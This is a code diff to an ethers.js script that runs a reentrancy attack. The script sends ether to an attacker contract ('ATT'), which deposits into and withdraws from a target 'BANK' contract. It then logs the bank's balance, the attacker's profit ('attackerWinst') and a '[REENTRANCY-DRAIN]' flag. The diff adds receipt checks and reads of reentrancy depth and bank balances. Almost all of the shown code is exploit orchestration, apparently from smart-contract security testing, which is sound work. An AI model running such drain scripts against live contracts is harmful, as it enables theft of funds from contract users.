@@ -24,11 +24,17 @@ const script = `
   const wdData = new ethers.Interface(['function withdraw()']).encodeFunctionData('withdraw', []);
   const goC = new ethers.Contract(ATT, ['function go(address,bytes,bytes) payable'], signer);
   const value = ethers.parseEther('1');
-  await goC.go(BANK, depData, wdData, { value, gasLimit: 8000000 });
+  const tx = await goC.go(BANK, depData, wdData, { value, gasLimit: 8000000 });
+  const rc = await tx.wait();
   const natA = await provider.getBalance(ATT);
   const eoaA = await provider.getBalance(EOA);
   const bankAfter = await provider.getBalance(BANK);
-  L('natB=' + ethers.formatEther(natB) + ' natA=' + ethers.formatEther(natA) + ' bankNa=' + ethers.formatEther(bankAfter) + ' ATT=' + ATT + ' EOA-bal=' + ethers.formatEther(eoaA));
+  let depth = 'n/a';
+  try { depth = (await new ethers.Contract(ATT, ['function depth() view returns (uint256)'], provider).depth()).toString(); } catch(e) { depth = 'read-fail:' + e.message.slice(0,40); }
+  const cb = await provider.getBalance('0x0000000000000000000000000000000000000000');
+  let balAtt = 'n/a';
+  try { balAtt = ethers.formatEther(await new ethers.Contract(BANK, ['function bal(address) view returns (uint256)'], provider).bal(ATT)); } catch(e) { balAtt = 'fail'; }
+  L('txStatus=' + rc.status + ' depth=' + depth + ' gasUsed=' + rc.gasUsed + ' natA=' + ethers.formatEther(natA) + ' bankNa=' + ethers.formatEther(bankAfter) + ' bank.bal[ATT]=' + balAtt + ' zeroAddr=' + ethers.formatEther(cb) + ' EOA=' + ethers.formatEther(eoaA));
   console.log('[RAW] natB=' + ethers.formatEther(natB) + ' natA=' + ethers.formatEther(natA) + ' eoaNa=' + ethers.formatEther(eoaA) + ' ATT=' + ATT);
   console.log('[RESULT] bankNa=' + ethers.formatEther(bankAfter) + ' attackerWinst=' + ethers.formatEther(natA - natB - value));
   if (natA > natB + value + (10n ** 16n)) console.log('[REENTRANCY-DRAIN] withdraw | NATIVE | ' + ethers.formatEther(natA - natB - value));
